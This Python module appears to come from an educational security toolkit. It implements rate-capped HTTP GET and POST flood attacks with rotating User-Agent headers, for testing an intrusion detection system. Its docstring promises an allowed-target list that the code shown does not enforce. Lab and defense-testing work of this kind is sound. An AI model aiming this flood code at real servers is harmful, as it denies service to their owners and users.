"""
threatforge/core/dos_simulation/http_flood.py

HTTP Flood Attack Simulation

SYLLABUS: Unit 11 - Simulate DoS and DDoS attacks
COVERAGE: CO4, CO5

THEORY:
HTTP flood overwhelms a web server by sending many valid HTTP requests.
Unlike SYN flood (network layer), this is an APPLICATION LAYER attack.

WHY HTTP FLOOD IS HARDER TO DEFEND:
- Requests look like legitimate traffic (valid HTTP)
- Cannot be blocked by simple packet filters
- Must be defended at application layer (WAF, rate limiting)
- This is EXACTLY what Sentinel/Vigil is designed to detect!

RATE CONTROL:
All floods in ThreatForge are rate-controlled for ethical use:
- Maximum 500 requests/second
- Auto-stop after configured duration
- No actual DDoS coordination (single source only)

ACADEMIC VALUE:
Demonstrates why application-layer IDS (like Sentinel) are needed
when network-layer defenses fail.
"""

import asyncio
import time
import random
from typing import Dict, Any, List
import httpx


# Rate limit - maximum allowed by ThreatForge
MAX_REQUESTS_PER_SECOND = 500

# User agents to rotate (makes requests look slightly varied)
USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0",
    "python-httpx/0.26.0",
    "ThreatForge-DoS-Tester/1.0 (Educational)"
]


class HTTPFlood:
    """
    Controlled HTTP flood attack generator.

    Generates measurable, rate-controlled HTTP traffic for
    educational DoS demonstration and defense testing.
    """

    def __init__(self, target_url: str, rate_limit: int = 100):
        """
        Initialize HTTP flood generator.

        Args:
            target_url: Target URL (must be in allowed list)
            rate_limit: Maximum requests per second (max 500)
        """
        self.target_url = target_url
        # Enforce maximum rate limit
        self.rate_limit = min(rate_limit, MAX_REQUESTS_PER_SECOND)
        self.results = {
            "total_sent": 0,
            "successful": 0,
            "failed": 0,
            "response_codes": {}
        }

    async def _send_single_request(
        self,
        client: httpx.AsyncClient,
        rotate_ua: bool = True
    ) -> Dict[str, Any]:
        """
        Send a single HTTP GET request.

        Args:
            client: Shared async HTTP client
            rotate_ua: Whether to rotate User-Agent headers

        Returns:
            Request result with status and timing
        """
        headers = {}
        if rotate_ua:
            headers["User-Agent"] = random.choice(USER_AGENTS)

        start = time.perf_counter()
        try:
            response = await client.get(self.target_url, headers=headers)
            elapsed = time.perf_counter() - start
            return {
                "success": True,
                "status_code": response.status_code,
                "response_time_ms": round(elapsed * 1000, 2)
            }
        except Exception as e:
            elapsed = time.perf_counter() - start
            return {
                "success": False,
                "error": str(e)[:50],
                "response_time_ms": round(elapsed * 1000, 2)
            }

    async def execute(
        self,
        duration_seconds: int,
        rotate_user_agent: bool = True
    ) -> Dict[str, Any]:
        """
        Execute HTTP flood for specified duration.

        ALGORITHM:
        Each second:
            Send self.rate_limit requests concurrently using asyncio.gather()
            Record all results
            Sleep remaining time to maintain rate
        Repeat for duration_seconds

        This generates self.rate_limit * duration_seconds total requests.

        Args:
            duration_seconds: How long to flood (max 120 seconds)
            rotate_user_agent: Whether to rotate UA headers

        Returns:
            Complete metrics from the flood
        """
        # Cap duration for safety
        duration_seconds = min(duration_seconds, 120)

        start_time = time.perf_counter()
        end_time = start_time + duration_seconds

        all_results = []
        second_metrics = []  # Per-second breakdown

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(5.0),
            follow_redirects=False
        ) as client:
            while time.perf_counter() < end_time:
                second_start = time.perf_counter()

                # Send rate_limit requests this second
                tasks = [
                    self._send_single_request(client, rotate_user_agent)
                    for _ in range(self.rate_limit)
                ]
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)

                # Process results
                second_success = 0
                second_failed = 0
                for result in batch_results:
                    if isinstance(result, Exception):
                        second_failed += 1
                        all_results.append({"success": False, "error": str(result)})
                    elif result.get("success"):
                        second_success += 1
                        status = result.get("status_code", 0)
                        self.results["response_codes"][status] = (
                            self.results["response_codes"].get(status, 0) + 1
                        )
                        all_results.append(result)
                    else:
                        second_failed += 1
                        all_results.append(result)

                second_metrics.append({
                    "second": len(second_metrics) + 1,
                    "sent": self.rate_limit,
                    "successful": second_success,
                    "failed": second_failed
                })

                # Sleep remaining time in this second
                elapsed_this_second = time.perf_counter() - second_start
                sleep_time = max(0, 1.0 - elapsed_this_second)
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)

        total_duration = time.perf_counter() - start_time
        total_sent = len(all_results)
        total_successful = sum(1 for r in all_results if r.get("success"))

        return {
            "attack_type": "http_get_flood",
            "target": self.target_url,
            "configured_rate": self.rate_limit,
            "duration_seconds": round(total_duration, 2),
            "total_requests_sent": total_sent,
            "successful_responses": total_successful,
            "failed_requests": total_sent - total_successful,
            "actual_rps": round(total_sent / total_duration, 2),
            "success_rate_pct": round((total_successful / max(total_sent, 1)) * 100, 2),
            "response_code_distribution": self.results["response_codes"],
            "per_second_breakdown": second_metrics,
            "avg_response_time_ms": round(
                sum(r.get("response_time_ms", 0) for r in all_results if r.get("success"))
                / max(total_successful, 1), 2
            )
        }


async def http_get_flood(
    target_url: str,
    requests_per_second: int = 50,
    duration_seconds: int = 30
) -> Dict[str, Any]:
    """
    Convenience function for HTTP GET flood.

    Args:
        target_url: Target URL
        requests_per_second: Rate (capped at 500)
        duration_seconds: Duration (capped at 120s)

    Returns:
        Complete flood metrics
    """
    flood = HTTPFlood(target_url, requests_per_second)
    return await flood.execute(duration_seconds)


async def http_post_flood(
    target_url: str,
    requests_per_second: int = 30,
    duration_seconds: int = 30,
    payload_size: int = 1024
) -> Dict[str, Any]:
    """
    HTTP POST flood with payload.

    POST floods consume more server CPU than GET floods
    because servers must parse the request body.

    Args:
        target_url: Target URL
        requests_per_second: Rate
        duration_seconds: Duration
        payload_size: POST body size in bytes

    Returns:
        Complete flood metrics
    """
    requests_per_second = min(requests_per_second, 200)  # Lower cap for POST
    duration_seconds = min(duration_seconds, 120)

    # Generate fake payload
    fake_payload = {"data": "A" * payload_size, "timestamp": time.time()}

    start_time = time.perf_counter()
    total_sent = 0
    total_success = 0

    async with httpx.AsyncClient(timeout=httpx.Timeout(5.0)) as client:
        end_time = start_time + duration_seconds
        while time.perf_counter() < end_time:
            tasks = [
                client.post(target_url, json=fake_payload)
                for _ in range(requests_per_second)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            total_sent += len(results)
            total_success += sum(
                1 for r in results
                if not isinstance(r, Exception) and r.status_code < 500
            )
            await asyncio.sleep(1.0)

    duration = time.perf_counter() - start_time
    return {
        "attack_type": "http_post_flood",
        "target": target_url,
        "payload_size_bytes": payload_size,
        "total_sent": total_sent,
        "total_success": total_success,
        "actual_rps": round(total_sent / duration, 2),
        "duration_seconds": round(duration, 2)
    }
